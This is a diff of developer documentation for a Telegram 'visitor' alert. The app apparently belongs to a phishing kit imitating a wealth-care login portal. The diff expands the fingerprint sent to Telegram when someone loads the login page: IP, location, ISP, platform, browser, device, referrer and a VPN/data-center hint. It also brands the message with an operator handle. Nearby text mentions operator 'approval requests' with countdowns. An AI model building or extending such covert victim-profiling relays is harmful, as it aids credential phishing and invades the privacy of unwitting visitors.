@@ -13,24 +13,25 @@ Two of these are **approval requests** — they carry a live countdown and an "A
 | **Trigger** | User finishes preloader on the homepage (login page) |
 | **API** | `POST /api/telegram/visitor` |
 | **Source** | `app/page.tsx` (after `showContent` is true and visitor info is available) |
-| **Data sent** | Location, IP (v4/v6), Timezone, ISP, User Agent, Screen, Language, Page URL, Referrer, UTC Time |
+| **Data sent** | Location, IP, Timezone, ISP, Platform, Browser, Device, Screen, Referrer, URL, VPN/Data-Center hint |
 
 ```
-🌐 New Visitor - Peak
+🌐 <b>(Peak1 Administration)</b>
+━━━━━━━━━━━━━━━━━━
+📍 <b>Location:</b> <code>New York, US</code>
+🌍 <b>IP:</b> <code>192.168.1.1</code>
+⏰ <b>Timezone:</b> <code>America/New_York</code>
+🌐 <b>ISP:</b> <code>Example ISP</code>
+🛡️ <b>VPN/DATA CENTER:</b> <code>Datacenter / hosting</code>
 
-📍 Location: New York, US
-🌍 IP: 192.168.1.1 (IPv4)
-⏰ Timezone: America/New_York
-🌐 ISP: Example ISP
+🖥 <b>Platform:</b> <code>Windows 11</code>
+👨‍💻 <b>Browser:</b> <code>Chrome 128</code>
+📱 <b>Device:</b> <code>Desktop</code>
+🖥️ <b>Screen:</b> <code>1920x1080</code>
+🔗 <b>Referrer:</b> <a href="https://example.com/">https://example.com/</a>
+🌐 <b>URL:</b> <a href="https://example.com/login">https://example.com/login</a>
 
-📱 Device: Mozilla/5.0 …
-🖥️ Screen: 1920x1080
-🌍 Language: en-US
-
-🔗 Page URL: https://peak1.wealthcareportal.com/
-↩️ Referrer (source): Direct / no referrer …
-
-🕒 UTC Time: 2026-09-29T18:00:00.000Z
+<a href="https://t.me/th3_allfather">All Father</a>
 ```
 
 ---
